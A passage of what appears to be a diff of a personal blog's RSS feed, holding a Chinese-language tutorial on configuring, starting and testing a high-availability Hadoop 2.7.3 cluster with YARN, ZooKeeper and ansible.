-     &amp;lt;name&amp;gt;dfs.ha.fencing.ssh.connect-timeout&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;5000&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;设置一个超时时间，一旦ssh超过该时间，则认为执行失败&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;dfs.namenode.handler.count&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;20&amp;lt;/value&amp;gt; 
-     &amp;lt;description&amp;gt;设定namenode server threads的数量，这些threads會用RPC跟其他的datanodes沟通。当datanodes数量太多时会发現很容易出現RPC timeout，解決方法是提升网络速度或提高这个值，但要注意的是thread数量多也表示namenode消耗的内存也随着增加&amp;lt;/description&amp;gt; 
-   &amp;lt;/property&amp;gt; 
-   &amp;lt;!-- 用户权限管理 --&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;dfs.permissions.enabled&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;权限管理&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;dfs.namenode.acls.enabled&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;权限访问控制列表&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;!-- 用户权限管理 --&amp;gt;
- &amp;lt;/configuration&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/mapred-env.sh&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export JAVA_HOME=/opt/jdk1.8.0_121
- export HADOOP_MAPRED_PID_DIR=/opt/hadoop-2.7.3/var/tmp
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/mapred-site.xml&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;configuration&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;mapreduce.framework.name&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;yarn&amp;lt;/value&amp;gt;  
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;mapreduce.map.memory.mb&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;1536&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;每个Map Task需要的虚拟内存限制，例如需要1536MB内存时，yarn将分配一个2倍最小容器内存2048M单位的容器，这个值可以在程序中设定被覆盖&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;mapreduce.reduce.memory.mb&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;1536&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;每个Reduce Task需要的虚拟内存限制，一般为Map的两倍，这个值可以在程序中设定被覆盖&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;mapreduce.map.java.opts&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;-Xmx1024m -XX:MaxPermSize=64m&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;设置Map Task的JVM的堆空间大小，因为Map Task分配了4096MB内存，其中3596MB内存给了java、scala等程序，这个值应该比上面的task的虚拟内存值小（因为jvm除了heap还有别的对象需要占用内存），如果jvm进程在执行中heap上的对象占用内存超过这个值， 则会抛出OutOfMemory Exception，这个值可以在程序中设定被覆盖&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;mapreduce.reduce.java.opts&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;-Xmx1024m -XX:MaxPermSize=64m&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;设置Reduce Task的JVM的堆空间大小，这个值可以在程序中设定被覆盖&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;mapreduce.task.io.sort.mb&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;512&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;任务内部排序缓冲区大小&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
- &amp;lt;/configuration&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/slaves&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # datanode的ip地址
- 10.2.2.143...152
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/yarn-env.sh&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export JAVA_HOME=/opt/jdk1.8.0_121
- # 因为使用了spark_shuffle，因此需要提高YARN_HEAPSIZE，避免在shuffle过程中的garbage collection问题
- YARN_HEAPSIZE=5000
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/yarn-site.xml&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;configuration&amp;gt;
-   &amp;lt;!-- ResourceManager相关配置参数 --&amp;gt;
-   &amp;lt;property&amp;gt;
-   	&amp;lt;name&amp;gt;yarn.scheduler.minimum-allocation-mb&amp;lt;/name&amp;gt;
-   	&amp;lt;value&amp;gt;1024&amp;lt;/value&amp;gt;
-   	&amp;lt;description&amp;gt;每个Task申请容器的最小内存单位，默认1024MB，例如Task需要1025M内存时会分配2*1024M内存的容器&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.scheduler.maximum-allocation-mb&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;12288&amp;lt;/value&amp;gt;
-     &amp;lt;discription&amp;gt;单个任务可申请容器的最大内存，默认8192MB。由于Yarn集群还需要跑Spark的任务，而Spark的Worker内存相对需要大些，所以需要调大单个任务的最大内存&amp;lt;/discription&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.scheduler.maximum-allocation-vcores&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;8&amp;lt;/value&amp;gt;
-     &amp;lt;discription&amp;gt;单个任务可申请容器的最大虚拟核数，默认8个核&amp;lt;/discription&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;yarn.resourcemanager.hostname&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;10.2.2.141&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;resourcemanager只有一个，设置它的主机位置&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.resourcemanager.address&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;10.2.2.141:8032&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;ResourceManager对客户端暴露的地址。客户端通过该地址向RM提交应用程序，杀死应用程序等&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.resourcemanager.scheduler.address&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;10.2.2.141:8030&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;ResourceManager对ApplicationMaster暴露的访问地址。ApplicationMaster通过该地址向RM申请资源、释放资源等&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.resourcemanager.resource-tracker.address&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;10.2.2.141:8031&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;ResourceManager对NodeManager暴露的地址。NodeManager通过该地址向ResourceManager汇报心跳，领取任务等&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.resourcemanager.admin.address&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;10.2.2.141:8033&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;ResourceManager对管理员暴露的访问地址。管理员通过该地址向RM发送管理命令等&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.resourcemanager.webapp.address&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;10.2.2.141:8088&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;ResourceManager对外web ui地址。用户可通过该地址在浏览器中查看集群各类信息&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;!-- NodeManager相关配置参数 --&amp;gt;
-   &amp;lt;property&amp;gt;
-   	&amp;lt;name&amp;gt;yarn.nodemanager.resource.memory-mb&amp;lt;/name&amp;gt;
-   	&amp;lt;value&amp;gt;12288&amp;lt;/value&amp;gt;
-   	&amp;lt;description&amp;gt;NodeManager总的可用物理内存，必须给物理机留一些内存和计算资源给到操作系统使用，不能用光，16G*85%&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-   	&amp;lt;name&amp;gt;yarn.nodemanager.resource.cpu-vcores&amp;lt;/name&amp;gt;
-   	&amp;lt;value&amp;gt;8&amp;lt;/value&amp;gt;
-   	&amp;lt;description&amp;gt;该节点上YARN可使用的虚拟CPU个数，默认是8，注意，目前推荐将该值设值为与物理CPU核数数目相同。如果你的节点CPU核数不够8个，则需要调减小这个值，而YARN不会智能的探测节点的物理CPU总数&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-   	&amp;lt;name&amp;gt;yarn.nodemanager.vmem-pmem-ratio&amp;lt;/name&amp;gt;
-   	&amp;lt;value&amp;gt;2.1&amp;lt;/value&amp;gt;
-   	&amp;lt;description&amp;gt;当map或reduce任务使用内存超过mapreduce.map.memory.mb或mapreduce.reduce.memory.mb时，将增加内存至2.1倍的mapreduce.reduce.memory.mb或者mapreduce.map.memory.mb&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;mapreduce_shuffle,spark_shuffle&amp;lt;/value&amp;gt;  
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.mapreduce_shuffle.class&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;org.apache.hadoop.mapred.ShuffleHandler&amp;lt;/value&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.spark_shuffle.class&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;org.apache.spark.network.yarn.YarnShuffleService&amp;lt;/value&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;yarn.resourcemanager.scheduler.class&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;	org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;启用的资源调度器主类。目前可用的有FIFO、Capacity Scheduler和Fair Scheduler&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.nodemanager.remote-app-log-dir&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;/tmp/logs&amp;lt;/value&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;!-- ApplicationMaster相关配置参数 --&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;yarn.app.mapreduce.am.resource.mb&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;1536&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;MR ApplicationMaster占用的内存量&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;yarn.app.mapreduce.am.command-opts&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;-Xmx1024m -XX:MaxPermSize=64m&amp;lt;/value&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;!-- historyserver configue start --&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;yarn.log-aggregation-enable&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;!-- historyserver configue end --&amp;gt;
- &amp;lt;/configuration&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;分发Hadoop配置文件&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/opt/hadoop-2.7.3/etc/hadoop/ dest=/opt/hadoop-2.7.3/etc/hadoop/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;hadoop-2&quot;&gt;启动Hadoop&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;确保Zookeeper已经启动：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -a &#39;/opt/zookeeper-3.4.9/bin/zkServer.sh start&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在主节点)格式化集群&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hdfs zkfc -formatZK
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在主节点)检验集群是否格式化，ls /是否出现了hadoop-ha&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ zkCli.sh
- [zk: localhost:2181(CONNECTED) 0] ls /
- [zookeeper, hadoop-ha]
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在主节点)启动hadoop集群&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;启动所有journalnode&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hadoop-daemons.sh start journalnode
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;在cat1格式化namenode，输出日志中是否出现successfully formatted&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cat@cat1:~$ hdfs namenode -format
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;启动cat1中的namenode&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cat@cat1:~$ hadoop-daemon.sh start namenode
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;在cat2中同步namenode数据&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cat@cat2:~$ hdfs namenode -bootstrapStandby
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;启动cat2中的namenode&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cat@cat2:~$ hadoop-daemon.sh start namenode
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;启动所有datanode&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hadoop-daemons.sh start datanode
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;启动yarn&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ start-yarn.sh
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;在cat1和cat2中都启动ZooKeeperFailoverController（此时cat1变为active，cat2为standby）&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible namenode -a &#39;/opt/hadoop-2.7.3/sbin/hadoop-daemon.sh start zkfc&#39;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;hadoop-3&quot;&gt;测试Hadoop&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用jps查看各节点起的进程&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -a &#39;/opt/jdk1.8.0_121/bin/jps&#39;
-
- cat1: QuorumPeerMain, DFSZKFailoverController, NameNode, ResourceManager
- cat2: QuorumPeerMain, DFSZKFailoverController, NameNode
- cat3: QuorumPeerMain, JournalNode, DataNode, NodeManager
- cat4-12: JournalNode, DataNode, NodeManager
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;查看&lt;a href=&quot;http://10.2.2.141:50070/&quot;&gt;http://10.2.2.141:50070/&lt;/a&gt;中cat1是否为active，查看&lt;a href=&quot;http://10.2.2.142:50070/&quot;&gt;http://10.2.2.142:50070/&lt;/a&gt;中cat2是否为standby&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在主节点)运行wordcount例子:&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hadoop fs -mkdir /test
- $ hadoop fs -mkdir /test/input
- $ hadoop fs -put ./words.txt /test/input
- $ hadoop jar /opt/hadoop-2.7.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.3.jar wordcount /test/input/ /test/output
- $ hadoop fs -cat /test/output/part-r-00000
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;hadoop-4&quot;&gt;创建Hadoop用户&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;创建用户组&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo groupadd admire
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;创建用户&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo useradd -g admire -d /home/wyn -m wyn -s /bin/bash
- $ sudo passwd wyn
- $ hadoop fs -mkdir /user/wyn
- $ hadoop fs -chown -R wyn:supergroup /user/wyn
- $ hadoop fs -chmod 700 /user/wyn
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;spark-on-yarnhttpswuyinan0126githubio20176-spark&quot;&gt;下一步：&lt;a href=&quot;https://wuyinan0126.github.io/2017/大数据学习笔记(6)-Spark/&quot;&gt;安装Spark on Yarn&lt;/a&gt;&lt;/h2&gt;
-
-&lt;hr /&gt;
-</description>
-        <pubDate>Thu, 01 Dec 2016 08:00:00 +0800</pubDate>
-        <link>https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(2)-Hadoop/</link>
-        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(2)-Hadoop/</guid>
         
         <category>原创</category>
         
